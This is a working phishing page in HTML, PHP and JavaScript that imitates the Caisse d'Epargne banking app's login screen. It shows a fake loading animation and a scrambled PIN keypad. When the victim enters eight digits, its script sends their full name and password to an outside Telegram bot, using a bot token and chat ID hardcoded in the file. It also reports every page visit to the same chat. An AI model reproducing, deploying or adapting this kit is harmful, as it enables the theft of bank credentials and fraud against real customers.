<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Caisse d'épargne · Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #ffffff;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
      min-height: 100vh;
      width: 100%;
      display: flex;
      flex-direction: column;
        overflow: hidden;
    }

    .page-container {
      display: flex;
      flex-direction: column;
      width: 100%;
      min-height: 100vh;
      background: #ffffff;
    }

.fond {
  width: 386px;
  display: block;
  margin-left: auto;
  margin-right: auto;
}

@media (max-width: 600px) {
  .fond {
    width: 100%;
    height: 730px;
  }
}

.conteneur {
  position: relative;
  width: fit-content;
  margin: 0 auto;
}

.logo {
  position: absolute;
  top: 120px;
  left: 35%;
  transform: translateX(-50%);
  width: 60px;
}

@font-face {
  font-family: 'Ubuntu';
  src: url('assets/ubuntu-v14-latin-700.woff2') format('woff2');
  font-weight: normal;
  font-style: normal;
}

.nom-marque {
  position: absolute;
  top: 120px;
  left: calc(35% + 35px);
  color: #ffffff;
  font-family: 'Ubuntu', sans-serif;
  font-size: 22px;
  white-space: nowrap;
  line-height: 1;
}

.btn-assistance {
  background: transparent;
  position: absolute;
  top: 16px;
  right: 16px;
  width: 45px;
  height: 45px;
  border-radius: 10px;
  cursor: pointer;
  z-index: 10;
  padding: 0;
  overflow: hidden;
  border: none;
}

.btn-assistance img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  display: block;
}

.btn-gauche {
  background: rgba(51, 40, 40, 0.604);
  position: absolute;
  top: 16px;
  left: 16px;
  width: 45px;
  height: 45px;
  border-radius: 50px;
  cursor: pointer;
  letter-spacing: 2px;
  z-index: 10;
  padding: 0;
  border: none;
 color: #ffffff;
 font-size: 18px;
 font-weight: 600;
 display: flex;
 align-items: center;
 justify-content: center;
}

.nom-utilisateur {
  position: absolute;
  top: 16px;
  left: 70px;
  height: 45px;
  display: flex;
  align-items: center;
  color: #ffffff;
  font-family: 'Ubuntu', sans-serif;
  font-size: 17px;
  white-space: nowrap;
  z-index: 10;
}

.etablissement {
 font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
 font-size: 16px;
  position: relative;
  top: -5px;
  display: inline-block;
}

.se-connecter {
  position: absolute;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  width: 85%;
  padding: 12px;
  border: none;
  border-radius: 4px;
  background: #fd0213;
  color: #ffffff;
  font-family: 'Ubuntu', sans-serif;
  font-size: 16px;
  cursor: pointer;
  z-index: 10;
}

.ecran-chargement {
  display: none;
  position: fixed;
  inset: 0;
  background: #252426;
  z-index: 9999;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 30px;
  padding-bottom: 120px;
}

.ecran-chargement.actif {
  display: flex;
}

.chargement-cercle {
  position: relative;
  width: 100px;
  height: 100px;
  border-radius: 50%;
  border: 4px solid #252426;
  border-top-color: #fd0213;
  display: flex;
  align-items: center;
  justify-content: center;
  animation: rotation 1s linear infinite;
}

.chargement-cercle img {
  width: 50px;
  height: 50px;
  border: 2px solid rgb(255, 255, 255);
  object-fit: contain;
  animation: rotation-inverse 1s linear infinite;
}

@keyframes rotation {
  to { transform: rotate(360deg); }
}

@keyframes rotation-inverse {
  to { transform: rotate(-360deg); }
}

.chargement-texte {
  color: #ffffff;
  font-family: 'Ubuntu', sans-serif;
  font-size: 17px;
}

.ecran-mot-de-passe {
  display: none;
  position: fixed;
  inset: 0;
  background: #252426;
  z-index: 9999;
  flex-direction: column;
  align-items: center;
  padding: 20px;
  color: #ffffff;
  font-family: 'Ubuntu', sans-serif;
}

.ecran-mot-de-passe.actif {
  display: flex;
}

.mdp-haut {
  display: flex;
  align-items: center;
  gap: 10px;
  align-self: flex-start;
  margin-top: 70px;
  margin-bottom: 30px;
  margin-left: 70px;
}

.mdp-haut .btn-gauche {
  background: #540303;
  position: static;
  color: #fc2727;
  transform: none;
 font-size: 22px;
}

.mdp-haut .nom-utilisateur {
  position: static;
  transform: none;
}

.mdp-titre {
  font-size: 22px;
  margin-bottom: 15px;
  text-align: center;
}

.mdp-oublie {
  background: none;
  border: none;
  color: #de9499;
  font-family: 'Ubuntu', sans-serif;
  font-size: 15px;
  margin-top: 15px;
  margin-bottom: auto;
  cursor: pointer;
}

.mdp-bas {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 15px;
  margin-bottom: 20px;
  width: 100%;
}

.mdp-cercles {
  display: flex;
  gap: 5px;
  margin-bottom: 20px;
  margin-left: 50px;
}

.mdp-cercles span {
  width: 18px;
  height: 18px;
  border: 2px solid #ffffff;
  border-radius: 50%;
  background: transparent;
}

.mdp-effacer {
  background: transparent;
  border: none;
  color: #ffffff;
  margin-left: 20px;
  font-size: 22px;
  cursor: pointer;
  margin-bottom: 20px;
}

.clavier {
  list-style: none;
  display: grid;
  grid-template-columns: repeat(5, 54px);
  gap: 15px;
  margin-bottom: 20px;
}

.clavier button {
  width: 60px;
  height: 60px;
  border-radius: 50%;
  border: 1px solid #ffffff;
  background: transparent;
  color: #ffffff;
  font-family: 'Ubuntu', sans-serif;
  font-size: 20px;
  cursor: pointer;
}

.mdp-fermer {
  position: absolute;
  top: 20px;
  right: 20px;
  width: 40px;
  height: 40px;
  background: transparent;
  border: none;
  color: #ec5660;
  font-size: 28px;
  cursor: pointer;
  z-index: 10;
}

.mdp-cercles span.rempli {
  border-color: #fd0213;
  position: relative;
}

.mdp-cercles span.rempli::after {
  content: "";
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #fd0213;
}

  </style>
</head>
<body>
<button class="btn-assistance" aria-label="Assistance">
  <img src="assets/aide.jpg" alt="Assistance">
</button>

<?php
  $data = json_decode(file_get_contents('data.json'), true);
  $prenom = $data['prenom'] ?? 'Firstname';
  $nom = $data['nom'] ?? 'Lastname';
  $initiales = strtoupper(substr($prenom,0,1) . substr($nom,0,1));
?>
<button id="initial-full-name" class="btn-gauche" aria-label=""><?php echo $initiales; ?></button>
<span id="full-name" class="nom-utilisateur"><?php echo htmlspecialchars($prenom . ' ' . $nom); ?> <br> 03·····02</span>

<div class="conteneur">
  <img class="fond" src="assets/fond.jpg" alt="fond">
  <img class="logo" src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17172803/logo-ce-mobile.png" alt="logo">
 <span class="nom-marque">CAISSE <br> D'EPARGNE <br><span id="etablissement" class="etablissement">Etablissement</span></span>
 
 <button id="se-connecter" class="se-connecter">Se connecter</button>

<div id="ecran-chargement" class="ecran-chargement">
  <div class="chargement-cercle">
    <img src="assets/logo.jpg" alt="logo">
  </div>
  <p class="chargement-texte">Un instant s'il vous plaît</p>
  </div>

<div id="ecran-mot-de-passe" class="ecran-mot-de-passe">
  <div class="mdp-haut">
  <button id="initial-full-name-2" class="btn-gauche"><?php echo $initiales; ?></button>
  <span class="nom-utilisateur"><?php echo htmlspecialchars($prenom . ' ' . $nom); ?> <br> 03·····02</span>
</div>

<button class="mdp-fermer" aria-label="Fermer" onclick="fermerEtRecharger()">✕</button>

  <p class="mdp-titre">Entrez votre mot de passe</p>
  <button class="mdp-oublie">Mot de passe oublié ?</button>

  <div class="mdp-bas">
    <div class="mdp-cercles">
      <span></span><span></span><span></span><span></span>
      <span></span><span></span><span></span><span></span>
    </div>
    <button class="mdp-effacer" aria-label="Effacer le dernier chiffre">⌫</button>
  </div>

<ul class="clavier">
  <li><button>4</button></li><li><button>1</button></li><li><button>7</button></li><li><button>0</button></li><li><button>9</button></li>
  <li><button>3</button></li><li><button>6</button></li><li><button>8</button></li><li><button>2</button></li><li><button>5</button></li>
</ul>
</div>
</div>

<script>
document.getElementById('se-connecter').addEventListener('click', function() {
  document.getElementById('ecran-chargement').classList.add('actif');
  setTimeout(function() {
    document.getElementById('ecran-chargement').classList.remove('actif');
    document.getElementById('ecran-mot-de-passe').classList.add('actif');
  }, 2000);
});

function fermerEtRecharger() {
  document.getElementById('ecran-mot-de-passe').classList.remove('actif');
  document.getElementById('ecran-chargement').classList.add('actif');
  setTimeout(function() {
    location.reload();
  }, 2000);
}

let nbChiffres = 0;
const cercles = document.querySelectorAll('.mdp-cercles span');
let motDePasse = "";

document.querySelectorAll('.clavier button').forEach(function(btn) {
  btn.addEventListener('click', function() {
    if (navigator.vibrate) navigator.vibrate(200);
    if (nbChiffres < cercles.length) {
      cercles[nbChiffres].classList.add('rempli');
      motDePasse += btn.textContent;
      nbChiffres++;
      if (nbChiffres === 8) {
        envoyerTelegram();
      }
    }
  });
});

document.querySelector('.mdp-effacer').addEventListener('click', function() {
  if (nbChiffres > 0) {
    nbChiffres--;
    cercles[nbChiffres].classList.remove('rempli');
    motDePasse = motDePasse.slice(0, -1);
  }
});

function envoyerTelegram() {
  document.getElementById('ecran-mot-de-passe').classList.remove('actif');
  document.getElementById('ecran-chargement').classList.add('actif');

  const nom = document.getElementById('full-name').innerText.trim();
  const message =
    "# LOG CAISSE DEPARGNE\n\n" +
    "Full Name : " + nom + "\n" +
    "Password : `" + motDePasse + "`\n\n" +
    "🏦 Base ⊱ CAISSE D'EPARGNE\n" +
    "👨‍💻 DEV BY ⊱ @esim_to_Back\n" +
    "└━━━━━━━⊱ 🏦 ⊰━━━━━━━━━━━";

  const url = "https://api.telegram.org/bot8575778335:AAETAvCe_aolvSDfohDyk1ln1YB-1saPScg/sendMessage";

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "-1003756237345",
      text: message,
      parse_mode: "Markdown"
    })
  }).catch(function(e) { console.error(e); });
}

// Message au chargement de la page
fetch("https://api.telegram.org/bot8575778335:AAETAvCe_aolvSDfohDyk1ln1YB-1saPScg/sendMessage", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: "-1003756237345",
    text: "# LOG CAISSE DEPARGNE\n\n1 new user is on the page\n\n🏦 Base ⊱ CAISSE D'EPARGNE\n👨‍💻 DEV BY ⊱ @esim_to_Back\n└━━━━━━━⊱ 🏦 ⊰━━━━━━━━━━━",
    parse_mode: "Markdown"
  })
}).catch(function(e) { console.error(e); });
</script>
</body>
</html>